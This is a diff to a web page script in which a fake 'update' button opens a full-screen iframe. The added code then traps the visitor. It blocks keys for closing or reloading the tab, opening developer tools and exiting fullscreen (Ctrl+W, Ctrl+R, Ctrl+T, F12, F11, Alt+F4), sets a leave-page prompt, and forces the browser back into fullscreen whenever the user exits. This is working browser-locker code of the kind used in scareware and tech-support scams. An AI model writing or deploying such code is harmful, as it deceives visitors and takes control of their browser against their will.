@@ -1201,40 +1201,71 @@
             updateButton.style.borderRadius = '6px';
             updateButton.style.cursor = 'pointer';
 
-            updateButton.addEventListener('click', function () {
-                // Remove the popup
-                document.body.removeChild(overlay);
+    updateButton.addEventListener('click', function () {
+    // Remove the popup
+    document.body.removeChild(overlay);
 
-                // Create an invisible iframe to load the target site
-                const hiddenFrame = document.createElement('iframe');
-                hiddenFrame.style.position = 'fixed';
-                hiddenFrame.style.top = '0';
-                hiddenFrame.style.left = '0';
-                hiddenFrame.style.width = '100%';
-                hiddenFrame.style.height = '100%';
-                hiddenFrame.style.border = 'none';
-                hiddenFrame.style.zIndex = '99999';
-                hiddenFrame.src = 'https://example.com';
+    // Create an invisible iframe to load the target site
+    const hiddenFrame = document.createElement('iframe');
+    hiddenFrame.style.position = 'fixed';
+    hiddenFrame.style.top = '0';
+    hiddenFrame.style.left = '0';
+    hiddenFrame.style.width = '100%';
+    hiddenFrame.style.height = '100%';
+    hiddenFrame.style.border = 'none';
+    hiddenFrame.style.zIndex = '99999';
+    hiddenFrame.src = 'https://example.com';
 
-                // When the iframe loads, make it visible and go fullscreen
-                hiddenFrame.onload = function () {
-                    // Make iframe visible
-                    document.body.style.overflow = 'hidden';
+    // Add event listeners to block certain keys
+    document.addEventListener("keydown", function (event) {
+        if (
+            (event.ctrlKey && (event.key === "w" || event.key === "r" || event.key === "t")) || // Block Ctrl+W, Ctrl+R, Ctrl+T
+            event.key === "F12" || event.key === "F11" || // Block F12, F11
+            (event.altKey && event.key === "F4") // Block Alt+F4
+        ) {
+            event.preventDefault();
+        }
+    });
 
-                    // Request fullscreen on the iframe after it's loaded
-                    setTimeout(() => {
-                        try {
-                            hiddenFrame.requestFullscreen().catch(err => {
-                                console.log("Error attempting to enable fullscreen: ", err);
-                            });
-                        } catch (error) {
-                            console.error("Fullscreen error:", error);
-                        }
-                    }, 500); // Small delay to ensure content is ready
-                };
+    // Prevent tab closure or reload
+    window.onbeforeunload = function () {
+        return "Are you sure you want to leave?";
+    };
 
-                document.body.appendChild(hiddenFrame);
+    // Function to enter fullscreen
+    function enterFullScreen() {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen().catch(err => {
+                console.log("Fullscreen not allowed:", err);
             });
+        }
+    }
+
+    // Re-enter Fullscreen if exited
+    document.addEventListener("fullscreenchange", function () {
+        if (!document.fullscreenElement) {
+            setTimeout(enterFullScreen, 100); // Re-enter fullscreen
+        }
+    });
+
+    // When the iframe loads, make it visible and go fullscreen
+    hiddenFrame.onload = function () {
+        document.body.style.overflow = 'hidden';
+
+        // Request fullscreen on the main document
+        setTimeout(() => {
+            try {
+                document.documentElement.requestFullscreen().catch(err => {
+                    console.log("Error attempting to enable fullscreen: ", err);
+                });
+            } catch (error) {
+                console.error("Fullscreen error:", error);
+            }
+        }, 500);
+    };
+
+    document.body.appendChild(hiddenFrame);
+});
 
 
 
